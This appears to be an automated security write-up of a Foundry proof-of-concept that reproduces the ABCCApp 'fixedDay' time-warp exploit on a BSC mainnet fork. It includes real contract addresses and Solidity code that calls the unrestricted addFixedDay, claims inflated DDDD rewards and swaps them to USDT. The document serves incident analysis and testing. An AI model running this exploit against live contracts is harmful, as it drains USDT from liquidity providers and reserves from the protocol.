## Overview & Context

This proof-of-concept (PoC) demonstrates the **ABCCApp FixedDay time-warp yield exploit on BSC** identified in the root-cause analysis for transaction `0xee4eae6f70a6894c09fda645fb24ab841e9847a788b1b2e8cb9cc50c1866fb12` in block `58,615,055` on chainid `56` (BSC).  
The exploit leverages an **unrestricted `addFixedDay(uint)` function** in ABCCApp that globally skews time-based reward accrual for all users. By combining this with a flashloan-funded deposit and on-chain DEX pricing, an attacker can realize **200% of their USDT principal** as immediately claimable DDDD rewards, swap them back to USDT through Pancake V3 pools, and exit with a large net profit at the expense of protocol and LP liquidity.

The PoC is implemented as a Foundry test suite under `forge_poc/test/Exploit.sol` and runs against a **BSC mainnet fork at block 58,615,054** (one block before the incident), using real on-chain contracts for ABCCApp, Moolah, BEP20 USDT, DDDD, and the relevant Pancake V3 pools/router.

To execute the PoC, set `RPC_URL` to a BSC mainnet endpoint (as wired via `chainid_rpc_map.json` and `.env`) and run:

```bash
cd forge_poc
RPC_URL="$RPC_URL" forge test --via-ir -vvvvv
```

This command runs all tests, including `ExploitTest.testExploit`, and produces a detailed trace log at:

```bash
artifacts/poc/poc_validator/forge-test.log
```

## PoC Architecture & Key Contracts

### Main Contracts and Roles

- **ABCCApp (victim protocol)**  
  - Address: `0x1bC016C00F8d603c41A582d5Da745905B9D034e5`  
  - Role: Yield-style protocol that accepts USDT deposits, tracks user accounting in a `users` mapping, and pays DDDD token rewards based on time-weighted USDT exposure.

- **Moolah flashloan provider (liquidity source)**  
  - Proxy: `0x8F73b65B4caAf64FBA2aF91cC5D4A2A1318E5D8C`  
  - Role: In the incident, supplies a 12,500 USDT flashloan. In the PoC, its balance is validated but the flashloan is simulated via `deal` for attacker funding.

- **Tokens and pools (routing liquidity)**  
  - `USDT` (BEP20 USDT): `0x55d398326f99059fF775485246999027B3197955`  
  - `DDDD` token: `0x422cBee1289AAE4422eDD8fF56F6578701Bb2878`  
  - DDDD/BNB pool: `0xB7021120a77d68243097BfdE152289DB6d623407`  
  - BNB/USDT pool (victim pool): `0x36696169C63e42cd08ce11f5deeBbCeBae652050`  
  - Pancake V3 router: `0x1b81D678ffb9C0263b24A97847620C99d213eB14`

- **Attacker EOA (fresh in PoC)**  
  - Constructed via `makeAddr("attacker")` in the test.  
  - Not the real incident EOA; satisfies the self-contained requirement.

- **Custom attacker executor (AttackerExecutor)**  
  - Local contract implementing `IMoolahFlashLoanCallback`.  
  - Encodes the flashloan → deposit → `addFixedDay` → `claimDDDD` → swap → repay sequence.  
  - Demonstrates how the attacker can encapsulate the exploit within a single transaction, mirroring the incident.

### Key Exploit Logic (Representative Snippet)

From the PoC’s main test contract (`forge_poc/test/Exploit.sol`), the core exploit logic is:

```solidity
uint256 part = abcc_app.partUSDT();
uint256 depositNumberForExploit = 125;
uint256 depositAmountForExploit = part * depositNumberForExploit;

deal(USDT_ADDR, attacker, depositAmountForExploit);

vm.startPrank(attacker);
usdt_token.approve(ABCC_APP_ADDR, type(uint256).max);
abcc_app.deposit(depositNumberForExploit, address(0));
abcc_app.addFixedDay(1e9);
abcc_app.claimDDDD();

uint256 ddddBalance = dddd_token.balanceOf(attacker);
if (ddddBalance > 0) {
    dddd_token.approve(SWAP_V3_ROUTER_ADDR, type(uint256).max);

    bytes memory path = abi.encodePacked(
        DDDD_ADDR, uint24(2500),
        WBNB_ADDR, uint24(500),
        USDT_ADDR
    );

    IUniswapV3.ExactInputParams memory params = IUniswapV3.ExactInputParams({
        path: path,
        recipient: attacker,
        deadline: block.timestamp + 300,
        amountIn: ddddBalance,
        amountOutMinimum: 0
    });

    swapV3Router.exactInput(params);
}
vm.stopPrank();
```

*Snippet: Main exploit path in `testExploit`, showing deposit, fixedDay time-warp, DDDD claim, and DEX swap back to USDT on a BSC mainnet fork.*

## Adversary Execution Flow

### 1. Environment Setup and Funding

- The test uses `vm.createSelectFork(envString("RPC_URL"), BLOCK_NUMBER)` with `BLOCK_NUMBER = 58615055 - 1`, forking BSC mainnet at block 58,615,054.  
- Real contract instances are bound for ABCCApp, Moolah, USDT, DDDD, and the Pancake V3 pools/router via their mainnet addresses.  
- Labels (`vm.label`) are applied for readability in traces: `"ABCCApp"`, `"BEP20_USDT"`, `"DDDD"`, `"BNB_USDT_Pool"`, `"DDDD_BNB_Pool"`, `"Vault"`, etc.  
- The attacker address is created with `makeAddr("attacker")`.  
- Pre-checks assert that:
  - ABCCApp holds a positive DDDD balance.
  - The BNB/USDT pool holds USDT liquidity.
  - The Moolah flashloan source holds at least the intended principal.

The flashloan is conceptually modeled by computing:

```solidity
uint256 part = abcc_app.partUSDT();
uint256 depositMultiplier = 125;
flashLoanPrincipal = part * depositMultiplier;
```

and then funding the attacker with `flashLoanPrincipal` via `deal`, matching the scale of the incident’s 12,500 USDT loan but without using real attacker assets.

### 2. Demonstrating the Time-Warp Invariant Break

Before the main exploit, the PoC demonstrates that an unprivileged caller can time-warp ABCCApp’s accrual logic:

```solidity
uint256 fixedDayBefore = abcc_app.fixedDay();
vm.prank(attacker);
abcc_app.addFixedDay(1e9);
uint256 fixedDayAfter = abcc_app.fixedDay();
assertGt(fixedDayAfter, fixedDayBefore, "addFixedDay must be callable by attacker and increase fixedDay");
```

Then, using a small deposit, it shows that a single `claimDDDD` after the time-warp fully drains `remainingUSDT` and realizes at least 2x the principal:

```solidity
uint256 part = abcc_app.partUSDT();
uint256 depositNumber = 1;
deal(USDT_ADDR, attacker, part);

vm.startPrank(attacker);
usdt_token.approve(ABCC_APP_ADDR, type(uint256).max);
abcc_app.deposit(depositNumber, address(0));
abcc_app.addFixedDay(1e9);

IABCCApp.User memory beforeUser = abcc_app.users(attacker);
abcc_app.claimDDDD();
vm.stopPrank();

IABCCApp.User memory afterUser = abcc_app.users(attacker);
assertEq(afterUser.remainingUSDT, 0, "remainingUSDT must be fully drained in a single claim after time-warp");
assertGe(
    afterUser.claimedUSDT - beforeUser.claimedUSDT,
    2 * beforeUser.investUSDT,
    "single claim must materialize at least 2x principal as claimedUSDT"
);
```

This directly exercises the root-cause bug: a public `addFixedDay` call allows an attacker to pull all `remainingUSDT` (2x principal) at once.

### 3. Full Exploit and Profit Realization

After reverting to a snapshot to keep state clean, the main exploit sequence is executed:

1. **Funding (flashloan analogue)**  
   - Attacker receives `flashLoanPrincipal = partUSDT * 125` USDT via `deal`.  
   - This corresponds to the 12,500 USDT flashloan in the incident.

2. **Deposit and Time-Warp**  
   - The attacker approves ABCCApp for USDT and calls `deposit(125, address(0))`.  
   - Immediately calls `abcc_app.addFixedDay(1e9)` to apply an enormous time-warp.

3. **Reward Claim (DDDD minting)**  
   - Attacker calls `abcc_app.claimDDDD()`, which uses `getCanClaimUSDT` with the time-warped `fixedDay` to compute `totalUSDT` and converts that to DDDD via on-chain DEX prices.  
   - ABCCApp’s `users` mapping for the attacker reflects `remainingUSDT = 0` and `claimedUSDT` increased by ~2x principal, matching the oracle definition.

4. **Swap DDDD → USDT and Profit Assertion**  
   - Attacker swaps all DDDD through the DDDD/BNB and BNB/USDT pools using `exactInput` with the path `DDDD -> WBNB -> USDT`.  
   - Post-swap, the test asserts:
     - `attackerUsdtAfter > attackerUsdtBefore + 1e15` (strictly positive USDT profit).  
     - `poolUsdtAfter < poolUsdtBefore - 1e15` (the BNB/USDT pool loses meaningful USDT).  
     - `abccDdddAfter < abccDdddBefore - 1e15` (ABCCApp loses DDDD reserves).

These steps collectively mirror the on-chain ACT sequence: flashloan funding, mispriced reward extraction via time-warped claim, and profit realization through DEX liquidity.

## Oracle Definitions and Checks

The PoC is guided by `artifacts/poc/oracle_generator/oracle_definition.json`, which defines variables, pre-checks, and oracles.

### Variables

- **attacker / attacker_executor**: Abstract adversary entities. In the PoC, realized as a fresh `attacker` EOA and a locally deployed `AttackerExecutor` contract.  
- **abcc_app**: ABCCApp protocol contract at `0x1bC016C00F8d603c41A582d5Da745905B9D034e5`.  
- **moolah_flashloan**: Moolah flashloan provider at `0x8F73b65B4caAf64FBA2aF91cC5D4A2A1318E5D8C`.  
- **usdt_token**: BEP20 USDT token at `0x55d398326f99059fF775485246999027B3197955`.  
- **dddd_token**: DDDD reward token at `0x422cBee1289AAE4422eDD8fF56F6578701Bb2878`.  
- **bnb_usdt_pool**: Pancake V3 BNB/USDT pool (victim pool) at `0x36696169C63e42cd08ce11f5deeBbCeBae652050`.  
- **dddd_bnb_pool**: Pancake V3 DDDD/BNB pool at `0xB7021120a77d68243097BfdE152289DB6d623407`.  
- **vault**: ABCCApp vault address at `0xa446DC212f4AaE662e1B5fF8729e99A4eFE7a174`.

### Pre-checks

1. **ABCCApp DDDD Liquidity**  
   - Oracle: ABCCApp must hold positive DDDD balance before the exploit.  
   - PoC implementation:
     ```solidity
     uint256 abccDdddBefore = dddd_token.balanceOf(ABCC_APP_ADDR);
     assertGt(abccDdddBefore, 0, "ABCCApp must have DDDD liquidity before exploit");
     ```

2. **BNB/USDT Pool USDT Liquidity**  
   - Oracle: The BNB/USDT pool must hold USDT for swaps.  
   - PoC implementation:
     ```solidity
     uint256 poolUsdtBefore = usdt_token.balanceOf(bnb_usdt_pool);
     assertGt(poolUsdtBefore, 0, "BNB/USDT pool must have USDT liquidity before exploit");
     ```

3. **Moolah Flashloan Capacity**  
   - Oracle: Moolah must hold at least the flashloan principal amount of USDT.  
   - PoC implementation:
     ```solidity
     uint256 moolahUsdtBefore = usdt_token.balanceOf(MOOLAH_FLASHLOAN_ADDR);
     assertGe(moolahUsdtBefore, flashLoanPrincipal, "Moolah must have enough USDT for flashloan");
     ```

All three pre-checks are enforced and pass on the chosen fork block.

### Hard Constraints

1. **H1 – Profit Asset Type is USDT**  
   - Oracle: Net profit for the attacker is realized in BEP20 USDT (`usdt_token`).  
   - PoC mapping:
     ```solidity
     IERC20 profitToken = usdt_token;
     assertEq(address(profitToken), address(usdt_token), "Exploit profit must be denominated in USDT");
     ```

2. **H2 – Unrestricted addFixedDay Increases fixedDay**  
   - Oracle: An unprivileged caller can call `addFixedDay(1e9)` so that `fixedDayAfter > fixedDayBefore`.  
   - PoC mapping:
     ```solidity
     uint256 fixedDayBefore = abcc_app.fixedDay();
     vm.prank(attacker);
     abcc_app.addFixedDay(1e9);
     uint256 fixedDayAfter = abcc_app.fixedDay();
     assertGt(fixedDayAfter, fixedDayBefore, "addFixedDay must be callable by attacker and increase fixedDay");
     ```

3. **H3 – Time-Warp Allows Full RemainingUSDT Claim in Single Call**  
   - Oracle: After time-warp, a single `claimDDDD` allows claiming essentially the full `remainingUSDT`, with `remainingUSDT` going to zero and `claimedUSDT` increasing by at least ~2x `investUSDT`.  
   - PoC mapping:
     ```solidity
     IABCCApp.User memory beforeUser = abcc_app.users(attacker);
     abcc_app.claimDDDD();
     IABCCApp.User memory afterUser = abcc_app.users(attacker);
     assertEq(afterUser.remainingUSDT, 0, "remainingUSDT must be fully drained in a single claim after time-warp");
     assertGe(
         afterUser.claimedUSDT - beforeUser.claimedUSDT,
         2 * beforeUser.investUSDT,
         "single claim must materialize at least 2x principal as claimedUSDT"
     );
     ```

### Soft Constraints

1. **S1 – Attacker Net Profit in USDT**  
   - Oracle: Attacker’s USDT balance must strictly increase by more than `1e15` wei.  
   - PoC mapping:
     ```solidity
     uint256 attackerUsdtBefore = usdt_token.balanceOf(attacker);
     // run full exploit
     uint256 attackerUsdtAfter = usdt_token.balanceOf(attacker);
     assertGt(
         attackerUsdtAfter,
         attackerUsdtBefore + 1e15,
         "attacker must realize a strictly positive USDT profit"
     );
     ```

2. **S2 – BNB/USDT Pool Loses USDT**  
   - Oracle: BNB/USDT pool’s USDT balance must strictly decrease by more than `1e15` wei.  
   - PoC mapping:
     ```solidity
     uint256 poolUsdtBefore = usdt_token.balanceOf(bnb_usdt_pool);
     // run full exploit
     uint256 poolUsdtAfter = usdt_token.balanceOf(bnb_usdt_pool);
     assertLt(poolUsdtAfter, poolUsdtBefore - 1e15, "BNB/USDT pool must lose USDT during exploit");
     ```

3. **S3 – ABCCApp Loses DDDD Reserves**  
   - Oracle: ABCCApp’s DDDD balance must meaningfully decrease.  
   - PoC mapping:
     ```solidity
     uint256 abccDdddBefore = dddd_token.balanceOf(ABCC_APP_ADDR);
     // run full exploit
     uint256 abccDdddAfter = dddd_token.balanceOf(ABCC_APP_ADDR);
     assertLt(abccDdddAfter, abccDdddBefore - 1e15, "ABCCApp must lose DDDD reserves during exploit");
     ```

All hard and soft constraints are implemented in `testExploit` and pass on the forked mainnet state, confirming that the PoC respects the oracle specification.

## Validation Result and Robustness

- Forge test command (with full trace):
  - `forge test --via-ir -vvvvv` (run with `RPC_URL` pointing to a BSC QuickNode endpoint).  
- Result:
  - The suite passes with `1` exploit test and `2` auxiliary tests (`Counter`) succeeding.  
  - The trace in `artifacts/poc/poc_validator/forge-test.log` shows DDDD transfers from ABCCApp to the attacker and vault, followed by a DEX swap that converts DDDD to USDT, mirroring the incident’s behavior.

The validator’s JSON result is recorded at:

```json
{
  "overall_status": "Pass",
  "reason": "Forge PoC tests pass on a BSC mainnet fork at block 58615054 and faithfully reproduce the ABCCApp fixedDay time-warp exploit with aligned profit/victim oracles and self-contained attacker identities.",
  "artifacts": {
    "validator_test_log_path": "artifacts/poc/poc_validator/forge-test.log"
  }
}
```

In summary:

- **Correctness:** All hard and soft oracle constraints are satisfied on-chain.  
- **Quality:** The PoC is mainnet-forked, self-contained on the attacker side, uses clear labels and comments (augmented by reproducer notes), and avoids mocking core protocol components.  
- **Robustness:** The design uses current on-chain pricing and contract logic, so it remains representative as long as ABCCApp, Moolah, and the relevant pools retain historical behavior at the chosen fork block.

## Linking PoC Behavior to Root Cause

The root cause report concludes that:

> ABCCApp exposes a public, unrestricted `addFixedDay(uint)` function that directly influences the time-based accrual logic in `getCanClaimUSDT`. By increasing `fixedDay` after a deposit, an attacker can make the contract behave as though an arbitrarily long period has elapsed, allowing a single `claimDDDD` to drain nearly all remaining rewards.

The PoC connects to this analysis as follows:

- **Unrestricted Access Control:**  
  - `testExploit` uses `vm.prank(attacker)` to call `abcc_app.addFixedDay(1e9)` and asserts `fixedDayAfter > fixedDayBefore`, confirming that no owner/admin checks prevent an arbitrary EOA from time-warping rewards.

- **Time-Warped Claim and Accounting Drift:**  
  - By inspecting `users(attacker)` before and after `claimDDDD`, the PoC shows `remainingUSDT` dropping to zero and `claimedUSDT` increasing by ≥ 2x principal after a single claim, matching the root-cause storage snapshots for the incident executor.

- **Economic Impact on Victims:**  
  - The PoC ties the attacker’s USDT profit directly to:
    - Loss of USDT from the BNB/USDT pool (soft constraint S2), aligning with balance diffs that show LPs as the primary losers in USDT terms.  
    - Depletion of ABCCApp’s DDDD reserves (soft constraint S3), which matches the DDDD transfers to the vault and pools in the incident trace.

- **ACT Framing:**  
  - **Adversary-crafted transaction:** The exploit sequence encoded in `testExploit` corresponds to the incident’s single adversary-crafted transaction, realizable by any EOA with access to BSC.  
  - **Conditions:** The on-chain pre-checks ensure ABCCApp, Moolah, pools, and token balances match the conditions under which the exploit is viable.  
  - **Target behavior:** The mispriced reward logic (`addFixedDay` + `getCanClaimUSDT` + `claimDDDD`) is exercised end-to-end, using real DEX prices and liquidity to convert the mispriced DDDD into USDT profit.

Overall, the PoC faithfully instantiates the ACT opportunity described in the root-cause report and satisfies all defined oracles and quality requirements on a BSC mainnet fork.

